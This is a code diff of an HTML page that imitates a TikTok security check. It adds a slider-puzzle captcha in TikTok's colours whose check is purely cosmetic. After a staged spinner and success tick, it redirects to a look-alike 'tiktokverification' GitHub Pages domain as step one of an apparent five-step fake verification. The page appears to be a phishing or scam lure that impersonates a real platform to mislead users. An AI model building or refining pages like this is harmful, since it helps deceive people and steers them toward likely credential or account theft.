@@ -4,94 +4,245 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        * { box-sizing: border-box; }
+        * { box-sizing: border-box; touch-action: none; }
 
         body, html {
             margin: 0; padding: 0; height: 100%;
             background: #ffffff;
-            /* Native font stacks support variable weights like 550 best */
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: block;
-            -webkit-font-smoothing: antialiased;
-            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; flex-direction: column; align-items: center;
+            -webkit-font-smoothing: antialiased; overflow: hidden;
         }
 
-        #button-container {
-            position: absolute;
-            bottom: 60px; 
-            width: 100%;
-            display: flex;
-            justify-content: center;
+        #puzzle-box {
+            margin-top: 10vh;
+            width: 92vw; max-width: 360px;
+            background: #ffffff; border-radius: 12px;
+            padding: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            border: 1px solid #eee;
+            opacity: 0; transition: opacity 0.5s ease;
         }
+
+        .puzzle-header { font-size: 15px; color: #161823; margin-bottom: 12px; font-weight: 550; }
+
+        #puzzle-stage {
+            position: relative; width: 100%; height: 190px;
+            background-size: cover; background-position: center;
+            border-radius: 6px; overflow: hidden; background-color: #f5f5f5;
+        }
+
+        #slot {
+            position: absolute; width: 52px; height: 52px;
+            background: rgba(0,0,0,0.65); border-radius: 4px;
+            box-shadow: inset 0 0 15px rgba(0,0,0,0.9); z-index: 1;
+        }
+
+        #piece {
+            position: absolute; width: 52px; height: 52px;
+            border-radius: 4px; z-index: 10;
+            box-shadow: 0 0 15px rgba(0,0,0,0.3), inset 0 0 0 1px rgba(255,255,255,0.3);
+            background-repeat: no-repeat;
+        }
+
+        #slider-track {
+            margin-top: 24px; width: 100%; height: 42px;
+            background: #F1F1F2; border-radius: 21px;
+            position: relative; border: 1px solid #EAEAEA;
+        }
+
+        #slider-handle {
+            position: absolute; top: 1px; left: 2px;
+            width: 38px; height: 38px;
+            background: #ffffff; border-radius: 50%;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+            cursor: grab; z-index: 30;
+            display: flex; justify-content: center; align-items: center;
+        }
+
+        #button-container { position: absolute; bottom: 60px; width: 100%; display: flex; justify-content: center; }
 
         #verify-btn {
-            width: 94vw !important; 
-            min-width: 94vw; 
-            height: 52px;
-            background-color: #FE2C55; 
-            color: #ffffff;
-            border: none;
-            border-radius: 4px;
-            
-            /* Typography: Exact 550 Weight */
-            font-size: 16px;
-            font-weight: 550; 
-            white-space: nowrap;
-            letter-spacing: 0.1px;
-            
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
-            outline: none;
-            -webkit-tap-highlight-color: transparent;
+            position: relative; width: 94vw !important; height: 52px;
+            background-color: #E1E1E2; color: #ffffff;
+            border: none; border-radius: 4px;
+            font-size: 16px; font-weight: 550;
+            display: flex; justify-content: center; align-items: center;
+            transition: all 0.3s ease; pointer-events: none;
         }
 
-        /* Grayed out state */
-        #verify-btn.loading {
-            background-color: #E1E1E2; 
-            color: transparent;
-            pointer-events: none;
+        #verify-btn.active { background-color: #FE2C55; pointer-events: auto; }
+
+        #verify-btn.loading #btn-text,
+        #verify-btn.success #btn-text { visibility: hidden; opacity: 0; }
+
+        .btn-overlay {
+            position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            display: none; justify-content: center; align-items: center;
         }
+
+        #verify-btn.loading .loading-overlay { display: flex; }
+        #verify-btn.success .success-overlay { display: flex; }
 
         .spinner {
-            display: none;
-            position: absolute;
-            width: 22px;
-            height: 22px;
-            border: 2.5px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: #ffffff;
+            width: 22px; height: 22px;
+            border: 2.5px solid rgba(0,0,0,0.08);
+            border-radius: 50%; border-top-color: #8A8B91;
             animation: spin 0.8s linear infinite;
         }
 
-        #verify-btn.loading .spinner {
-            display: block;
-            border-top-color: #8A8B91;
-            border-left-color: rgba(0,0,0,0.1);
+        #verify-btn.success { background-color: #00D166 !important; }
+
+        .check-icon {
+            width: 28px; height: 28px;
+            stroke: #ffffff; stroke-width: 4; stroke-linecap: round;
+            stroke-linejoin: round; fill: none;
+            stroke-dasharray: 48; stroke-dashoffset: 48;
+            animation: draw 0.4s ease forwards;
         }
 
         @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes draw { to { stroke-dashoffset: 0; } }
     </style>
 </head>
 <body>
 
+    <div id="puzzle-box">
+        <div class="puzzle-header">Complete the puzzle</div>
+        <div id="puzzle-stage">
+            <div id="slot"></div>
+            <div id="piece"></div>
+        </div>
+        <div id="slider-track">
+            <div id="slider-handle">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="#161823"><path d="M8 5l8 7-8 7V5z"/></svg>
+            </div>
+        </div>
+    </div>
+
     <div id="button-container">
         <button id="verify-btn" onclick="startLoading()">
             <span id="btn-text">Verify (0/5)</span>
-            <div class="spinner"></div>
+            <div class="btn-overlay loading-overlay"><div class="spinner"></div></div>
+            <div class="btn-overlay success-overlay">
+                <svg class="check-icon" viewBox="0 0 24 24"><path d="M20 6L9 17L4 12"></path></svg>
+            </div>
         </button>
     </div>
 
     <script>
+        const imageIds = [
+            // Architecture
+            '1552832230-c0197dd311b5', '1531572753322-ad063cecc140', '1542820229-081e0c12af0b',
+            '1533105079780-92b9be482077', '1503917988258-f19782f4baee', '1514890547357-a9ee2887a31e',
+            '1513581166391-887a96ddeafd', '1502602898657-3e91760cbb34', '1548115184-bc6544d06a58',
+            '1553913861-c0fddf2619ee',
+            // Landscapes
+            '1470071459604-3b5ec3a7fe05', '1464822759023-fed622ff2c3b', '1506744038136-46273834b3fb',
+            '1433086966358-54859d0ed716', '1472396961695-1ad244fe2ad4', '1441974231531-c6227db76b6e',
+            '1501785888041-af3ef285b470', '1490750967868-886d5c593b48', '1431036101491-16a1119b5bc5',
+            '1518098268026-4e89f1a2cd8e'
+        ];
+
+        const box = document.getElementById('puzzle-box');
+        const stage = document.getElementById('puzzle-stage');
+        const piece = document.getElementById('piece');
+        const slot = document.getElementById('slot');
+        const handle = document.getElementById('slider-handle');
+        const track = document.getElementById('slider-track');
+        const btn = document.getElementById('verify-btn');
+
+        function initPuzzle() {
+            const randomId = imageIds[Math.floor(Math.random() * imageIds.length)];
+            const randomImg = `https://images.unsplash.com/photo-${randomId}?auto=format&fit=crop&w=1000&q=80`;
+            const img = new Image();
+            img.src = randomImg;
+
+            img.onload = () => {
+                const stageWidth = stage.offsetWidth;
+                const stageHeight = stage.offsetHeight;
+                
+                const imgRatio = img.width / img.height;
+                const stageRatio = stageWidth / stageHeight;
+                let bgSizeW, bgSizeH, bgOffX, bgOffY;
+
+                if (imgRatio > stageRatio) {
+                    bgSizeH = stageHeight;
+                    bgSizeW = stageHeight * imgRatio;
+                    bgOffX = (bgSizeW - stageWidth) / 2;
+                    bgOffY = 0;
+                } else {
+                    bgSizeW = stageWidth;
+                    bgSizeH = stageWidth / imgRatio;
+                    bgOffX = 0;
+                    bgOffY = (bgSizeH - stageHeight) / 2;
+                }
+
+                stage.style.backgroundImage = `url('${randomImg}')`;
+                piece.style.backgroundImage = `url('${randomImg}')`;
+                piece.style.backgroundSize = `${bgSizeW}px ${bgSizeH}px`;
+                
+                const randomX = Math.floor(Math.random() * (stageWidth - 120)) + 60;
+                const randomY = Math.floor(Math.random() * (stageHeight - 60)) + 10;
+
+                slot.style.left = randomX + "px";
+                slot.style.top = randomY + "px";
+                piece.style.top = randomY + "px";
+                
+                piece.style.backgroundPosition = `-${randomX + bgOffX}px -${randomY + bgOffY}px`;
+                piece.style.left = "10px";
+                
+                box.style.opacity = "1";
+                setupInteractions(randomX);
+            };
+            img.onerror = () => initPuzzle();
+        }
+
+        function setupInteractions(targetX) {
+            let isDragging = false;
+            const onMove = (e) => {
+                if (!isDragging) return;
+                const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+                const rect = track.getBoundingClientRect();
+                let x = clientX - rect.left - 19;
+                
+                if (x < 2) x = 2;
+                if (x > rect.width - 40) x = rect.width - 40;
+                handle.style.left = x + "px";
+
+                const progress = (x - 2) / (rect.width - 42);
+                const stageWidth = stage.offsetWidth;
+                const pieceX = 10 + (progress * (stageWidth - 70)); 
+
+                if (Math.abs(pieceX - targetX) < 8) {
+                    piece.style.left = targetX + "px";
+                    btn.classList.add('active');
+                } else {
+                    piece.style.left = pieceX + "px";
+                    btn.classList.remove('active');
+                }
+            };
+
+            handle.addEventListener('mousedown', () => isDragging = true);
+            handle.addEventListener('touchstart', () => isDragging = true);
+            window.addEventListener('mousemove', onMove);
+            window.addEventListener('touchmove', onMove, { passive: false });
+            window.addEventListener('mouseup', () => isDragging = false);
+            window.addEventListener('touchend', () => isDragging = false);
+        }
+
         function startLoading() {
-            const btn = document.getElementById('verify-btn');
+            btn.classList.remove('active');
             btn.classList.add('loading');
             setTimeout(() => {
-                window.location.href = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
-            }, 1200);
+                btn.classList.remove('loading');
+                btn.classList.add('success');
+                setTimeout(() => {
+                    window.location.href = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
+                }, 1000);
+            }, 1500);
         }
-    </script>
 
+        initPuzzle();
+    </script>
 </body>
 </html>
